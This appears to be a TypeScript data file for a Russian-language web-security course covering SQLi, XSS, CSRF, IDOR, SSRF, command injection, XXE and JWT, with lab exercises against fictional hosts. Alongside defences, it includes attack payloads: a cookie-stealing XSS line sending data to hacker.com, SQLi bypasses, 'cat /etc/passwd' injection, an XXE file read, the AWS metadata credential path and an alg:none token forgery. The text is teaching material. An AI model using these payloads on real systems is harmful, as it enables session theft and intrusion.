export const webSecurityState: Record<'EN' | 'RU', any> = {
  EN: { 
    title: "Web App Security (EN)", 
    description: "English translation pending.", 
    lessons: [
    {
        "id": "lesson-1",
        "title": "Введение: OWASP Top 10 и HTTP-прокси (Burp Suite)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "Что такое OWASP Top 10?"
                },
                {
                    "type": "text",
                    "content": "OWASP (Open Worldwide Application Security Project) — это международная организация, которая анализирует уязвимости и каждые несколько лет выпускает рейтинг 10 самых критических угроз для веб-приложений. Этот список — библия для Bug Bounty хантеров и пентестеров. Знание OWASP обязательно на любом собеседовании по кибербезопасности."
                },
                {
                    "type": "heading",
                    "content": "Анатомия веб-запроса"
                },
                {
                    "type": "text",
                    "content": "Обычный пользователь взаимодействует с вебом через графический интерфейс браузера. Но под капотом браузер отправляет текстовые HTTP-запросы. Хакеры не \"кликают по кнопкам\", они перехватывают и модифицируют эти сырые запросы."
                },
                {
                    "type": "text",
                    "content": "Типичный HTTP-запрос состоит из:"
                },
                {
                    "type": "list",
                    "items": [
                        "Метод и Путь: POST /api/login HTTP/1.1 (Что мы хотим сделать).",
                        "Заголовки (Headers): Host, User-Agent, Cookie (Метаданные).",
                        "Тело (Body): user=admin&pass=123 (Сами данные, отделены от заголовков пустой строкой)."
                    ]
                },
                {
                    "type": "tip",
                    "content": "Главный инструмент: Burp Suite Вы не сможете искать серьезные уязвимости просто через консоль разработчика в Chrome. Платформа PortSwigger (создатели Web Security Academy) разработала лучший в мире инструмент  Burp Suite. Это локальный прокси-сервер. Он встает МЕЖДУ вашим браузером и интернетом. Когда вы отправляете форму, запрос застревает в Burp Suite (модуль Proxy Intercept). Вы можете отправить его в Repeater, изменить скрытые поля (например, убрать проверку цены, поменять ID пользователя) и нажать \"Send\". Сервер обработает подделанный запрос, доверяя ему."
                },
                {
                    "type": "tip",
                    "content": "Ресурсы (MUST HAVE) PortSwigger Academy: Раздел \"Burp Suite Basics\". Вы обязаны скачать бесплатную версию Burp Suite Community Edition и научиться перехватывать запросы во вкладке Proxy -> Intercept. Без этого инструмента Web Security не существует. DVWA (Damn Vulnerable Web App): Разверните локально через Docker. Это ваша легальная песочница."
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
            "task": "Допишите скрипт.",
            "starterCode": "# --- ЭМУЛЯТОР BURP SUITE REPEATER ---\n# Вы перехватили POST-запрос к API онлайн-магазина (добавление в корзину).\n# Разработчик совершил классическую ошибку: он передает ЦЕНУ товара со стороны клиента!\n\n# Задача: \n# Измените параметр 'price' в теле запроса (внизу) на 1.\n# Затем нажмите \"SEND EXPLOIT\".\n\nPOST /api/cart/add HTTP/1.1\nHost: vulnerable-shop.thm\nUser-Agent: Mozilla/5.0 (Hacker)\nCookie: session=xyz123\nContent-Type: application/x-www-form-urlencoded\n\nitem_id=42&price=1000&quantity=1"
        },
        "type": "http"
    },
    {
        "id": "lesson-2",
        "title": "SQL Injection (SQLi)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "Что такое SQL-инъекция?"
                },
                {
                    "type": "text",
                    "content": "Веб-сайт хранит все данные в Базе Данных (MySQL, PostgreSQL). Уязвимость появляется, когда бэкенд берет ввод пользователя и напрямую вклеивает его (конкатенация) в SQL-запрос."
                },
                {
                    "type": "tip",
                    "content": "Уязвимый код (PHP):"
                },
                {
                    "type": "code",
                    "content": "$user = $_POST['username'];\n// Хакер контролирует $user и может закрыть кавычку!\n$sql = \"SELECT * FROM users WHERE username = '\" . $user . \"' AND password = '...'\";"
                },
                {
                    "type": "heading",
                    "content": "1. Обход авторизации (Auth Bypass)"
                },
                {
                    "type": "text",
                    "content": "Если хакер введет в поле логина admin' -- , запрос превратится в:\n        SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...'\n        Символы -- (или #) означают комментарий. База отбрасывает проверку пароля и пускает нас под админом."
                },
                {
                    "type": "tip",
                    "content": "2. Кража всей базы (UNION-Based SQLi) Если уязвимость находится в параметре, который выводит данные на экран (например, news.php?id=1), используется оператор UNION. Ввод: ?id=1 UNION SELECT username, password FROM users Оператор UNION приклеивает результаты второго запроса к первому. Сервер вернет на страницу не только новость, но и все логины/пароли! Важно: количество колонок в обоих SELECT должно совпадать."
                },
                {
                    "type": "tip",
                    "content": "Защита: Prepared Statements (Подготовленные выражения) Единственный надежный способ защиты от SQLi  использование параметризованных запросов (PDO в PHP). При этом структура запроса отправляется в БД отдельно, а пользовательские данные  отдельно. БД воспринимает ввод хакера строго как строку, а не как SQL-команду. Даже если хакер введет ' OR 1=1, база будет искать пользователя с буквальным именем ' OR 1=1."
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
            "task": "Допишите скрипт.",
            "starterCode": "# Вы перехватили запрос к странице просмотра новости.\n# URL уязвим к SQL-инъекции в параметре 'id'.\n# Сейчас сервер делает на бэкенде запрос: \n# SELECT title, text FROM news WHERE id = 1\n\n# Задача (UNION SQLi): \n# Внедрите SQL код в параметр id. \n# Используйте UNION SELECT, чтобы вытащить колонки 'user' и 'password' из таблицы 'admins'.\n# Не забудьте в конце добавить комментарий (--), чтобы отрезать возможные остатки оригинального запроса.\n\nGET /news.php?id=1 HTTP/1.1\nHost: vulnerable-blog.thm\nCookie: session=guest"
        },
        "type": "http"
    },
    {
        "id": "lesson-3",
        "title": "Cross-Site Scripting (XSS)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "Атака на Frontend (Браузер жертвы)"
                },
                {
                    "type": "text",
                    "content": "Если SQLi атакует сервер, то XSS (Межсайтовый скриптинг) атакует браузеры других пользователей. Уязвимость возникает, когда сайт выводит введенный пользователем текст на страницу \"как есть\", без HTML-кодирования (экранирования)."
                },
                {
                    "type": "tip",
                    "content": "Уязвимый код (Node.js / Express):"
                },
                {
                    "type": "code",
                    "content": "app.get('/search', (req, res) => {\n    // Ввод берется из URL ?q=... и отдается прямо в HTML\n    res.send(`<h1>Результаты для: ${req.query.q}</h1>`); \n});"
                },
                {
                    "type": "text",
                    "content": "Если хакер отправит жертве ссылку: http://site.com/search?q=<script>alert(1)</script>, браузер жертвы прочитает этот код не как обычный текст, а как исполнимый JavaScript!"
                },
                {
                    "type": "heading",
                    "content": "Три вида XSS"
                },
                {
                    "type": "list",
                    "items": [
                        "Reflected (Отраженный): Пейлоад летит в URL. Работает, только если жертва кликнет по специальной ссылке от хакера.",
                        "Stored (Хранимый): Хакер пишет пейлоад в комментарий или пост. Сервер сохраняет его в БД. Теперь каждый, кто просто откроет страницу с постом, будет атакован автоматически.",
                        "DOM-based: Сервер вообще ни при чем. Уязвимость в клиентском JS (например, использование element.innerHTML = location.hash)."
                    ]
                },
                {
                    "type": "tip",
                    "content": "Кража сессий (Session Hijacking) alert(1)  это лишь Proof of Concept (доказательство уязвимости). Реальный хакер внедряет код, который незаметно читает ваши Cookies и отправляет на сервер злоумышленника: <script>fetch('http://hacker.com/log?c=' + document.cookie)</script> Получив вашу сессионную куку, хакер подставляет её себе и становится вами."
                },
                {
                    "type": "tip",
                    "content": "Защита: HttpOnly и CSP 1. Флаг HttpOnly: Если бэкенд выдает куки с флагом Set-Cookie: session=123; HttpOnly, JavaScript физически не сможет прочитать document.cookie. Это убивает кражу сессий через XSS! 2. Content Security Policy (CSP): HTTP-заголовок, который запрещает браузеру выполнять инлайн-скрипты и позволяет грузить скрипты только с доверенных доменов."
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
            "task": "Допишите скрипт.",
            "starterCode": "# Вы перехватили запрос добавления комментария в блог (Stored XSS).\n# Сайт никак не фильтрует (не эскейпит) параметр 'text'.\n\n# Задача:\n# Внедрите в параметр 'text' классический XSS пейлоад.\n# Используйте тег <script>, внутри которого вызовите: alert(document.cookie)\n\nPOST /add_comment HTTP/1.1\nHost: vulnerable-forum.thm\nContent-Type: application/x-www-form-urlencoded\n\npost_id=42&text=Hello, nice post!"
        },
        "type": "http"
    },
    {
        "id": "lesson-4",
        "title": "Cross-Site Request Forgery (CSRF)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "Подделка межсайтовых запросов"
                },
                {
                    "type": "text",
                    "content": "Представьте, что вы залогинились в bank.com. Браузер сохранил вашу Cookie. В другой вкладке вы открыли сайт хакера evil.com. Хакер разместил там невидимую форму:"
                },
                {
                    "type": "code",
                    "content": "<form action=\"http://bank.com/transfer\" method=\"POST\">\n    <input type=\"hidden\" name=\"to\" value=\"Hacker\">\n    <input type=\"hidden\" name=\"amount\" value=\"1000\">\n</form>\n<script>document.forms[0].submit();</script>"
                },
                {
                    "type": "text",
                    "content": "Браузер отправляет POST-запрос в банк. И самое страшное: браузер автоматически прикрепляет вашу банковскую Cookie к этому запросу! Банк думает, что это вы сами нажали кнопку \"Перевести\", и переводит деньги. CSRF эксплуатирует доверие сервера к браузеру."
                },
                {
                    "type": "tip",
                    "content": "Защита 1: Anti-CSRF Tokens Сервер генерирует случайную строку (Токен) и вставляет её скрытым полем <input type=\"hidden\" name=\"csrf_token\" value=\"abc123xyz\"> в каждую вашу форму. При отправке денег сервер сверяет токен из запроса с токеном в сессии. Сайт хакера (из-за политики SOP) не может прочитать этот токен с сайта банка, поэтому подделать форму становится невозможно."
                },
                {
                    "type": "tip",
                    "content": "Защита 2: Атрибут SameSite Встроенная защита современных браузеров. Если кука выдана с флагом Set-Cookie: session=123; SameSite=Lax (или Strict), браузер откажется прикреплять её к POST-запросам, которые инициированы с другого домена (evil.com). Это практически убило классический CSRF, но пентестеры всё еще находят старые системы с SameSite=None."
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
            "task": "Допишите скрипт.",
            "starterCode": "# Вы анализируете эндпоинт изменения Email адреса.\n# Вы заметили, что:\n# 1. Запрос использует метод GET (что категорически запрещено для изменения состояния).\n# 2. В запросе НЕТ Anti-CSRF токена!\n\n# Задача: \n# Вы пишете код для сайта хакера. \n# Разместите в поле 'payload' HTML-тег картинки <img>. \n# В атрибут src поместите вредоносный URL: http://bank.thm/change_email?email=hacker@evil.com\n# При попытке браузера загрузить картинку, он выполнит GET-запрос с куками жертвы!\n\nPOST /hacker-site/save_payload HTTP/1.1\nHost: evil.thm\nContent-Type: application/x-www-form-urlencoded\n\npayload="
        },
        "type": "http"
    },
    {
        "id": "lesson-5",
        "title": "IDOR и BOLA (Broken Access Control)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "IDOR (Insecure Direct Object Reference)"
                },
                {
                    "type": "text",
                    "content": "OWASP Top 1 последних лет — это сломанный контроль доступа. Уязвимость возникает, когда сервер проверяет, что вы залогинены, но забывает проверить, имеете ли вы право доступа к конкретному объекту."
                },
                {
                    "type": "text",
                    "content": "Вы открываете свой счет за заказ: https://shop.com/receipt?id=5102. Вы просто меняете URL на ?id=5101. Сервер послушно возвращает вам чек чужого пользователя (с его адресом и картой)!"
                },
                {
                    "type": "tip",
                    "content": "BOLA (Broken Object Level Authorization) в API В современных REST/GraphQL API эта уязвимость называется BOLA. Хакер перехватывает мобильный трафик, видит запрос GET /api/v1/users/777, и отправляет его в Burp Intruder. Intruder автоматически перебирает цифры от 1 до 100000, и хакер за 5 минут скачивает всю базу данных пользователей сервиса (Mass Enumeration)."
                },
                {
                    "type": "tip",
                    "content": "Защита: UUID и Проверка владельца 1. UUIDv4: Вместо порядковых ID (1, 2, 3), используйте длинные рандомные идентификаторы (f47ac10b-58cc-4372-a567-0e02b2c3d479). Подобрать чужой ID брутфорсом станет невозможно (вероятность 1 к триллионам). 2. Строгий Access Control: Бэкенд ВСЕГДА должен сравнивать: if (requested_order.user_id != current_session.user_id) throw 403 Forbidden;."
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
            "task": "Допишите скрипт.",
            "starterCode": "# Вы перехватили запрос на просмотр электронного чека за ваш заказ.\n# Ваш ID заказа: 905. \n# Вы предполагаете, что самый первый заказ в системе (с ID = 1)\n# принадлежит администратору или директору.\n\n# Задача (IDOR): \n# Измените параметры запроса так, чтобы просмотреть чужой заказ.\n\nGET /api/orders/receipt?order_id=905 HTTP/1.1\nHost: shop.thm\nCookie: session=user_xyz"
        },
        "type": "http"
    },
    {
        "id": "lesson-6",
        "title": "SSRF (Server-Side Request Forgery)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "Заставляем сервер работать на нас"
                },
                {
                    "type": "text",
                    "content": "SSRF — это уязвимость, позволяющая хакеру заставить веб-сервер отправить HTTP-запрос на произвольный домен по выбору хакера. Обычно это происходит в функциях типа \"Загрузить аватар по URL\" или \"Сделать превью ссылки\"."
                },
                {
                    "type": "text",
                    "content": "Сервер берет URL хакера (?url=http://evil.com/img.jpg), делает к нему запрос ОТ СВОЕГО ИМЕНИ и возвращает результат."
                },
                {
                    "type": "heading",
                    "content": "В чем критическая опасность?"
                },
                {
                    "type": "text",
                    "content": "Хакер передает ?url=http://localhost:3306 (или 127.0.0.1). Запрос исходит изнутри самого сервера! Это позволяет хакеру обойти внешние фаерволы и обращаться к локальным портам сервера (Redis, MySQL, скрытые панели админов), которые торчат только наружу localhost."
                },
                {
                    "type": "tip",
                    "content": "Облачный Апокалипсис (AWS Metadata SSRF) Почти все современные сайты работают в облаках (AWS, Google Cloud). В AWS есть захардкоженный внутренний IP-адрес 169.254.169.254. К нему можно обратиться только изнутри сервера EC2, чтобы получить метаданные. Хакер отправляет SSRF: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/. Сервер послушно делает запрос к облаку и возвращает хакеру AWS Access Keys (Секретные ключи администратора). Хакер получает полный контроль над всей облачной инфраструктурой компании (именно так хакнули банк Capital One)."
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
            "task": "Допишите скрипт.",
            "starterCode": "# Сайт позволяет проверять статус сторонних API через эндпоинт /check_status\n# Сервер берет ваш URL и выполняет к нему HTTP-запрос изнутри своей сети.\n\n# Задача (SSRF): \n# Замените 'http://google.com' на магический внутренний IP-адрес \n# AWS Metadata (169.254.169.254), чтобы вытащить секретные ключи IAM роли сервера!\n# Полный путь: http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\n\nPOST /api/check_status HTTP/1.1\nHost: cloud-app.thm\nContent-Type: application/x-www-form-urlencoded\n\ntarget_url=http://google.com"
        },
        "type": "http"
    },
    {
        "id": "lesson-7",
        "title": "OS Command Injection (RCE)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "Внедрение команд ОС"
                },
                {
                    "type": "text",
                    "content": "Если SQLi позволяет выполнять команды базы данных, то OS Command Injection позволяет выполнять команды операционной системы Linux/Windows напрямую. Это моментальный RCE (Remote Code Execution) и полный захват сервера."
                },
                {
                    "type": "tip",
                    "content": "Уязвимый код (PHP):"
                },
                {
                    "type": "code",
                    "content": "$target = $_POST['ip'];\n// Программа пингует введенный IP, запуская консоль Linux\nsystem(\"ping -c 3 \" . $target);"
                },
                {
                    "type": "heading",
                    "content": "Техника эксплуатации (Метасимволы Shell)"
                },
                {
                    "type": "text",
                    "content": "В терминале Linux можно запустить несколько команд друг за другом, используя разделители:"
                },
                {
                    "type": "list",
                    "items": [
                        "; (Точка с запятой) — выполнить следующую команду безусловно.",
                        "&& (Логическое И) — выполнить вторую команду, только если первая удалась.",
                        "| (Пайп) — передать результат первой команды во вторую."
                    ]
                },
                {
                    "type": "text",
                    "content": "Если хакер введет в поле IP: 8.8.8.8; cat /etc/passwd, сервер выполнит:\n        ping -c 3 8.8.8.8; cat /etc/passwd.\n        Сначала пройдет пинг, а затем сервер послушно выведет системный файл с пользователями на экран!"
                },
                {
                    "type": "tip",
                    "content": "Защита Никогда не используйте функции system(), exec() или os.system() с пользовательским вводом. Если это жизненно необходимо, используйте встроенные функции ОС для экранирования (например, escapeshellarg() в PHP), которые превращают весь ввод хакера в одну безопасную строку (оборачивают в кавычки)."
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
            "task": "Допишите скрипт.",
            "starterCode": "# Мы перехватили запрос к инструменту \"Network Diagnostic Tool\" (как в DVWA).\n# Инструмент принимает параметр 'ip' и выполняет консольную команду ping.\n\n# Задача:\n# Внедрите OS Command Injection! \n# После IP-адреса (например, 127.0.0.1) добавьте разделитель (точку с запятой ;) \n# и напишите команду для чтения файла: cat /etc/passwd\n\nPOST /tools/ping HTTP/1.1\nHost: vulnerable-admin.thm\nContent-Type: application/x-www-form-urlencoded\n\nip=127.0.0.1"
        },
        "type": "http"
    },
    {
        "id": "lesson-8",
        "title": "XXE (XML External Entity)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "Парсинг XML"
                },
                {
                    "type": "text",
                    "content": "Многие энтерпрайз-приложения (B2B, банки, SOAP API) обмениваются данными не в формате JSON, а в формате XML. За обработку XML на сервере отвечают парсеры (например, libxml2)."
                },
                {
                    "type": "heading",
                    "content": "В чем уязвимость?"
                },
                {
                    "type": "text",
                    "content": "В стандарте XML есть древняя и опасная фича — DTD (Document Type Definition) и Сущности (Entities). Entity — это как переменная. Вы объявляете её в начале XML, а потом подставляете в текст. Но стандарт позволяет создавать Внешние Сущности (External Entities), которые берут значение из локального файла на сервере или даже по HTTP!"
                },
                {
                    "type": "tip",
                    "content": "Анатомия атаки XXE Хакер отправляет на сервер модифицированный XML: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> Здесь мы объявили сущность xxe, которая читает системный файл. Далее в теле XML мы вызываем её: <productId>&xxe;</productId> Уязвимый XML-парсер видит SYSTEM \"file://...\", послушно читает файл с диска сервера, подставляет его текст вместо &xxe;, и сервер возвращает нам результат!"
                },
                {
                    "type": "tip",
                    "content": "Защита от XXE Поскольку эта фича встроена в сам стандарт XML, единственный надежный способ защиты  полностью отключить обработку внешних сущностей (DTD) в настройках вашего XML-парсера на бэкенде."
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
            "task": "Допишите скрипт.",
            "starterCode": "# Вы перехватили запрос к API проверки наличия товара (Stock Check).\n# Приложение принимает данные в формате XML.\n\n# Задача (XXE Attack):\n# 1. Сразу после XML декларации, добавьте определение DTD:\n# <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n# 2. Внутри тега <productId> замените цифру 1 на вашу сущность: &xxe;\n\nPOST /api/stock HTTP/1.1\nHost: enterprise-shop.thm\nContent-Type: application/xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<stockCheck>\n    <productId>1</productId>\n    <storeId>1</storeId>\n</stockCheck>"
        },
        "type": "http"
    },
    {
        "id": "lesson-9",
        "title": "Уязвимости JWT (JSON Web Tokens)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "Эра микросервисов и JWT"
                },
                {
                    "type": "text",
                    "content": "Раньше сессии хранились в оперативной памяти сервера (Session ID). Сегодня микросервисы используют Stateless авторизацию через JWT. JWT — это длинная строка, которую выдает сервер при логине. Браузер прикрепляет её в заголовок Authorization: Bearer <token> ко всем запросам."
                },
                {
                    "type": "heading",
                    "content": "Анатомия JWT"
                },
                {
                    "type": "text",
                    "content": "Токен состоит из 3 частей, разделенных точкой: HEADER . PAYLOAD . SIGNATURE."
                },
                {
                    "type": "list",
                    "items": [
                        "Header: Указывает алгоритм шифрования (например, {\"alg\": \"HS256\"}).",
                        "Payload: Сами данные пользователя (например, {\"user\": \"guest\", \"role\": \"user\"}). ВНИМАНИЕ: Header и Payload НЕ ЗАШИФРОВАНЫ! Это просто кодировка Base64Url. Любой может их прочитать и изменить.",
                        "Signature (Подпись): Это криптографический хэш (Header + Payload + Secret Key сервера). Именно подпись гарантирует, что хакер не изменил Payload. Сервер пересчитывает подпись и, если она не совпадает, бракует токен."
                    ]
                },
                {
                    "type": "tip",
                    "content": "Атака \"alg: none\" (Bypass) Плохие библиотеки JWT поддерживали алгоритм none (без подписи). Хакер берет свой JWT, декодирует Base64, меняет в Header алгоритм на \"alg\": \"none\", меняет в Payload \"role\": \"admin\", и вообще удаляет часть с Signature. Сервер видит алгоритм none, решает, что подпись проверять не нужно, и пускает хакера под админом!"
                },
                {
                    "type": "tip",
                    "content": "Подбор секретного ключа (Bruteforce) Если сервер использует слабый секретный ключ (например, \"secret123\"), хакер может скормить JWT программе Hashcat: hashcat -m 16500 jwt.txt rockyou.txt. Вычислив секрет, хакер сможет генерировать валидные JWT с подписью для ЛЮБЫХ пользователей!"
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
            "task": "Допишите скрипт.",
            "starterCode": "# Мы перехватили запрос к админ-панели.\n# Сервер использует уязвимую библиотеку JWT, которая принимает токены без подписи (alg: none).\n\n# Нормальный токен: \n# Header: {\"alg\": \"HS256\"} -> eyJhbGciOiJIUzI1NiJ9\n# Payload: {\"user\": \"guest\"} -> eyJ1c2VyIjoiZ3Vlc3QifQ\n# Signature: ...hash...\n\n# Задача (JWT Bypass):\n# Мы уже закодировали для вас поддельные части:\n# Fake Header: {\"alg\": \"none\"} -> eyJhbGciOiJub25lIn0\n# Fake Payload: {\"user\": \"admin\"} -> eyJ1c2VyIjoiYWRtaW4ifQ\n\n# Склейте поддельный Header и Payload через точку. \n# Подпись оставьте ПУСТОЙ (просто поставьте точку в конце: Header.Payload. )\n# Замените токен в заголовке Authorization!\n\nGET /api/admin/dashboard HTTP/1.1\nHost: api.startup.thm\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        },
        "type": "http"
    }
] 
  },
  RU: { 
    title: "Web App Security", 
    description: "SQLi, XSS, CSRF, IDOR и другие уязвимости.", 
    lessons: [
    {
        "id": "lesson-1",
        "title": "Введение: OWASP Top 10 и HTTP-прокси (Burp Suite)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "Что такое OWASP Top 10?"
                },
                {
                    "type": "text",
                    "content": "OWASP (Open Worldwide Application Security Project) — это международная организация, которая анализирует уязвимости и каждые несколько лет выпускает рейтинг 10 самых критических угроз для веб-приложений. Этот список — библия для Bug Bounty хантеров и пентестеров. Знание OWASP обязательно на любом собеседовании по кибербезопасности."
                },
                {
                    "type": "heading",
                    "content": "Анатомия веб-запроса"
                },
                {
                    "type": "text",
                    "content": "Обычный пользователь взаимодействует с вебом через графический интерфейс браузера. Но под капотом браузер отправляет текстовые HTTP-запросы. Хакеры не \"кликают по кнопкам\", они перехватывают и модифицируют эти сырые запросы."
                },
                {
                    "type": "text",
                    "content": "Типичный HTTP-запрос состоит из:"
                },
                {
                    "type": "list",
                    "items": [
                        "Метод и Путь: POST /api/login HTTP/1.1 (Что мы хотим сделать).",
                        "Заголовки (Headers): Host, User-Agent, Cookie (Метаданные).",
                        "Тело (Body): user=admin&pass=123 (Сами данные, отделены от заголовков пустой строкой)."
                    ]
                },
                {
                    "type": "tip",
                    "content": "Главный инструмент: Burp Suite Вы не сможете искать серьезные уязвимости просто через консоль разработчика в Chrome. Платформа PortSwigger (создатели Web Security Academy) разработала лучший в мире инструмент  Burp Suite. Это локальный прокси-сервер. Он встает МЕЖДУ вашим браузером и интернетом. Когда вы отправляете форму, запрос застревает в Burp Suite (модуль Proxy Intercept). Вы можете отправить его в Repeater, изменить скрытые поля (например, убрать проверку цены, поменять ID пользователя) и нажать \"Send\". Сервер обработает подделанный запрос, доверяя ему."
                },
                {
                    "type": "tip",
                    "content": "Ресурсы (MUST HAVE) PortSwigger Academy: Раздел \"Burp Suite Basics\". Вы обязаны скачать бесплатную версию Burp Suite Community Edition и научиться перехватывать запросы во вкладке Proxy -> Intercept. Без этого инструмента Web Security не существует. DVWA (Damn Vulnerable Web App): Разверните локально через Docker. Это ваша легальная песочница."
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
            "task": "Допишите скрипт.",
            "starterCode": "# --- ЭМУЛЯТОР BURP SUITE REPEATER ---\n# Вы перехватили POST-запрос к API онлайн-магазина (добавление в корзину).\n# Разработчик совершил классическую ошибку: он передает ЦЕНУ товара со стороны клиента!\n\n# Задача: \n# Измените параметр 'price' в теле запроса (внизу) на 1.\n# Затем нажмите \"SEND EXPLOIT\".\n\nPOST /api/cart/add HTTP/1.1\nHost: vulnerable-shop.thm\nUser-Agent: Mozilla/5.0 (Hacker)\nCookie: session=xyz123\nContent-Type: application/x-www-form-urlencoded\n\nitem_id=42&price=1000&quantity=1"
        },
        "type": "http"
    },
    {
        "id": "lesson-2",
        "title": "SQL Injection (SQLi)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "Что такое SQL-инъекция?"
                },
                {
                    "type": "text",
                    "content": "Веб-сайт хранит все данные в Базе Данных (MySQL, PostgreSQL). Уязвимость появляется, когда бэкенд берет ввод пользователя и напрямую вклеивает его (конкатенация) в SQL-запрос."
                },
                {
                    "type": "tip",
                    "content": "Уязвимый код (PHP):"
                },
                {
                    "type": "code",
                    "content": "$user = $_POST['username'];\n// Хакер контролирует $user и может закрыть кавычку!\n$sql = \"SELECT * FROM users WHERE username = '\" . $user . \"' AND password = '...'\";"
                },
                {
                    "type": "heading",
                    "content": "1. Обход авторизации (Auth Bypass)"
                },
                {
                    "type": "text",
                    "content": "Если хакер введет в поле логина admin' -- , запрос превратится в:\n        SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...'\n        Символы -- (или #) означают комментарий. База отбрасывает проверку пароля и пускает нас под админом."
                },
                {
                    "type": "tip",
                    "content": "2. Кража всей базы (UNION-Based SQLi) Если уязвимость находится в параметре, который выводит данные на экран (например, news.php?id=1), используется оператор UNION. Ввод: ?id=1 UNION SELECT username, password FROM users Оператор UNION приклеивает результаты второго запроса к первому. Сервер вернет на страницу не только новость, но и все логины/пароли! Важно: количество колонок в обоих SELECT должно совпадать."
                },
                {
                    "type": "tip",
                    "content": "Защита: Prepared Statements (Подготовленные выражения) Единственный надежный способ защиты от SQLi  использование параметризованных запросов (PDO в PHP). При этом структура запроса отправляется в БД отдельно, а пользовательские данные  отдельно. БД воспринимает ввод хакера строго как строку, а не как SQL-команду. Даже если хакер введет ' OR 1=1, база будет искать пользователя с буквальным именем ' OR 1=1."
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
            "task": "Допишите скрипт.",
            "starterCode": "# Вы перехватили запрос к странице просмотра новости.\n# URL уязвим к SQL-инъекции в параметре 'id'.\n# Сейчас сервер делает на бэкенде запрос: \n# SELECT title, text FROM news WHERE id = 1\n\n# Задача (UNION SQLi): \n# Внедрите SQL код в параметр id. \n# Используйте UNION SELECT, чтобы вытащить колонки 'user' и 'password' из таблицы 'admins'.\n# Не забудьте в конце добавить комментарий (--), чтобы отрезать возможные остатки оригинального запроса.\n\nGET /news.php?id=1 HTTP/1.1\nHost: vulnerable-blog.thm\nCookie: session=guest"
        },
        "type": "http"
    },
    {
        "id": "lesson-3",
        "title": "Cross-Site Scripting (XSS)",
        "theory": {
            "sections": [
                {
                    "type": "heading",
                    "content": "Атака на Frontend (Браузер жертвы)"
                },
                {
                    "type": "text",
                    "content": "Если SQLi атакует сервер, то XSS (Межсайтовый скриптинг) атакует браузеры других пользователей. Уязвимость возникает, когда сайт выводит введенный пользователем текст на страницу \"как есть\", без HTML-кодирования (экранирования)."
                },
                {
                    "type": "tip",
                    "content": "Уязвимый код (Node.js / Express):"
                },
                {
                    "type": "code",
                    "content": "app.get('/search', (req, res) => {\n    // Ввод берется из URL ?q=... и отдается прямо в HTML\n    res.send(`<h1>Результаты для: ${req.query.q}</h1>`); \n});"
                },
                {
                    "type": "text",
                    "content": "Если хакер отправит жертве ссылку: http://site.com/search?q=<script>alert(1)</script>, браузер жертвы прочитает этот код не как обычный текст, а как исполнимый JavaScript!"
                },
                {
                    "type": "heading",
                    "content": "Три вида XSS"
                },
                {
                    "type": "list",
                    "items": [
                        "Reflected (Отраженный): Пейлоад летит в URL. Работает, только если жертва кликнет по специальной ссылке от хакера.",
                        "Stored (Хранимый): Хакер пишет пейлоад в комментарий или пост. Сервер сохраняет его в БД. Теперь каждый, кто просто откроет страницу с постом, будет атакован автоматически.",
                        "DOM-based: Сервер вообще ни при чем. Уязвимость в клиентском JS (например, использование element.innerHTML = location.hash)."
                    ]
                },
                {
                    "type": "tip",
                    "content": "Кража сессий (Session Hijacking) alert(1)  это лишь Proof of Concept (доказательство уязвимости). Реальный хакер внедряет код, который незаметно читает ваши Cookies и отправляет на сервер злоумышленника: <script>fetch('http://hacker.com/log?c=' + document.cookie)</script> Получив вашу сессионную куку, хакер подставляет её себе и становится вами."
                },
                {
                    "type": "tip",
                    "content": "Защита: HttpOnly и CSP 1. Флаг HttpOnly: Если бэкенд выдает куки с флагом Set-Cookie: session=123; HttpOnly, JavaScript физически не сможет прочитать document.cookie. Это убивает кражу сессий через XSS! 2. Content Security Policy (CSP): HTTP-заголовок, который запрещает браузеру выполнять инлайн-скрипты и позволяет грузить скрипты только с доверенных доменов."
                }
            ]
        },
        "practice": {
            "title": "Практика",
            "description": "Модифицируйте сырой HTTP-запрос для эксплуатации уязвимости.",
